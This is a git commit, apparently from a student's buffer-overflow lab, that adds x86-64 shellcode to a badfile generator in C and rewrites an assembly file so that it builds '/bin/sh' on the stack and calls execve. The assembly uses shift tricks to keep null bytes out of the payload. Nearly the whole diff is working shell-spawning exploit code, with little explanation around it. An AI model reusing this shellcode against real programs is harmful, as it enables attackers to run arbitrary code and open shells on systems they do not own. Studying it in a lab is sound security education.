84386486321ddece8ac270a52177ee357221b4d1
bikshan chatterjee <bchatterjee7980@gmail.com>
2022-05-02 01:13:19 +0530

    thikache

--- badfile-gen.c
+++ badfile-gen.c
@@ -16,10 +16,32 @@ int main()
     char code[1000];
     int idx = 0;
 
-
-
-
-
+    // opcode directly hexdump theke neoa
+    code[idx++]= 0xb8;  code[idx++] = 0x2f;
+    code[idx++]= 0x73;  code[idx++] = 0x68;
+    code[idx++]= 0xff;  code[idx++] = 0x48;
+    code[idx++]= 0xc1;  code[idx++] = 0xe0;
+    code[idx++]= 0x28;  code[idx++] = 0x48;
+    code[idx++]= 0xc1;  code[idx++] = 0xe8;
+    code[idx++]= 0x08;  code[idx++] = 0x48;
+    code[idx++]= 0x0d;  code[idx++] = 0x2f;
+    code[idx++]= 0x62;  code[idx++] = 0x69;
+    code[idx++]= 0x6e;  code[idx++] = 0x50;
+    code[idx++]= 0x48;  code[idx++] = 0x89;
+    code[idx++]= 0xe7;  code[idx++] = 0x48;
+    code[idx++]= 0x31;  code[idx++] = 0xc0;
+    code[idx++]= 0x50;  code[idx++] = 0x57;
+    code[idx++]= 0x48;  code[idx++] = 0x89;
+    code[idx++]= 0xe6;  code[idx++] = 0x48;
+    code[idx++]= 0x31;  code[idx++] = 0xd2;
+    code[idx++]= 0xb8;  code[idx++] = 0x3b;
+    code[idx++]= 0xff;  code[idx++] = 0xff;
+    code[idx++]= 0xff;  code[idx++] = 0x48;
+    code[idx++]= 0xc1;  code[idx++] = 0xe0;
+    code[idx++]= 0x38;  code[idx++] = 0x48;
+    code[idx++]= 0xc1;  code[idx++] = 0xe8;
+    code[idx++]= 0x38;  code[idx++] = 0x0f;
+    code[idx++]= 0x05;
 
     return 0;
 }
--- overflow.asm
+++ overflow.asm
@@ -4,27 +4,47 @@ _start:
 	movq $0xaabbccdd, %rbx
 
 	# get string "/bin/sh" in stack
-	movq $0x0068732f, %rax   	# half string
-	movq $1073741824, %rbx 		# 2^30
-	mulq %rbx
-	movq $4, %rbx			# 2^2
-	mulq %rbx
+	# movl $0x68732f, %eax   		# half string
+	# movq $1073741824, %rbx 		# 2^30
+	# mulq %rbx
+	# movq $4, %rbx			# 2^2
+	# mulq %rbx
+	# orq $0x6e69622f, %rax
+	# pushq %rax
+
+	movl $0xff68732f, %eax
+	shlq $40, %rax
+	shrq $8, %rax
 	orq $0x6e69622f, %rax
 	pushq %rax
 
 	# print check
+	# movq %rsp, %rsi
+	# movq $1, %rax
+	# movq $1, %rdi
+	# movq $8, %rdx
+	# syscall
+
+
+	# filename argument: rdi
+	movq %rsp, %rdi
+	 
+	# argv argument: rsi
+	xorq %rax, %rax
+	pushq %rax
+	pushq %rdi
 	movq %rsp, %rsi
-	movq $1, %rax
-	movq $1, %rdi
-	movq $8, %rdx
-	syscall
 
+	# envp argument: rdx
+	xorq %rdx, %rdx
 
-
-
-	movq $0, %rdi			# file-name (/bin/sh)
-	movq $60, %rax  		# sys_execve
+	movl $0xffffff3b, %eax  		# sys_execve
+	shlq $56, %rax
+	shrq $56, %rax
 	syscall
 	movq $0xaabbccdd, %rbx
 
 
+	# exit
+	# movq $60, %rax
+	# syscall
